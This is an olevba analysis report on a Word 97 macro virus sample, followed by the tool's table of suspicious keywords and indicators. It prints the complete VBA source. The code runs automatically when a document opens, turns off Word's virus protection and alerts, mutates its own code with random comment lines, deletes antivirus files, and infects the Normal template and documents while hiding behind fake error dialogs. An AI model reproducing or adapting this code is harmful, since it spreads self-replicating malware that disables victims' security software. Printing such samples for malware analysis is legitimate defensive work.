olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hf755.bas 
in file: Virus.MSWord.VMPCK1 - OLE stream: 'Macros/VBA/Hf755'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()

    ' Word97 Macro Virii Creation Kit
    ' ===============================
    ' Code by Jack Twoflower/LzØ Vx
    ' ===============================
    ' W97M.XxX

On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
.ScreenUpdating = False
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Application.VBE.ActiveVBProject.VBComponents("Hf755").Export "C:\Hf755.sys"
 'This code is taken from Pyro | Thanks
Set Current = MacroContainer
For Grow = 1 To 20
Number = Current.VBProject.VBComponents("Hf755").CodeModule.ProcCountLines("AutoOpen", vbext_pk_Proc)
RandomLine = Int(Rnd() * Number + 1)
RemarkLength = Int(Rnd() * 40 + 1)
For Length = 1 To RemarkLength
Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next Length
Current.VBProject.VBComponents("Hf755").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
Remark = ""
Next Grow
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN\*.*")
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN95\*.*")
Kill ("C:\Programme\Norton Antivirus\V32scan.dll")
Kill ("C:\Programme\Norton Antivirus\Virscan.dat")
Kill ("C:\PROGRAMME\TBAV\TBAV.DAT")
Kill ("C:\TBAV\TBAV.DAT")
Kill ("C:\Programme\Dr Solomon's\Anti-Virus Toolkit\*.*")
ActiveDocument.FollowHyperlink Address:="http://www.xxx.com", NewWindow:=False, AddHistory:=True
Assistant.Visible = True
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
.Heading = "W97MVCK[Jack Twoflower/LzØ Vx]"
.Animation = msoAnimationSearching
.Show
End With
Assistant.Visible = False
Set Bl851 = ActiveDocument.VBProject.VBComponents
Set Cf941 = NormalTemplate.VBProject.VBComponents
For y = 1 To Cf941.Count
If Cf941(y).Name = "Hf755" Then Hg214 = True
Next y
For y = 1 To Bl851.Count
If Bl851(y).Name = "Hf755" Then Sf117 = True
Next y
If Hg214 = True And Sf117 = True Then Exit Sub
If Hg214 = True And Sf117 <> True Then Bl851.Import "c:\Hf755.sys": ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Hg214 <> True And Sf117 = True Then Cf941.Import "c:\Hf755.sys": NormalTemplate.Save
If Day(Now()) = 31 Then MsgBox "This virus was created with W97MVCK by Jack Twoflower"
End Sub
Sub ExtrasMakro()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub AnsichtCode()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub AnsichtVBCode()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub DateiDokVorlagen()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub FormatFormatvorlage()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.xxx.com  |URL                                          |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |V32scan.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

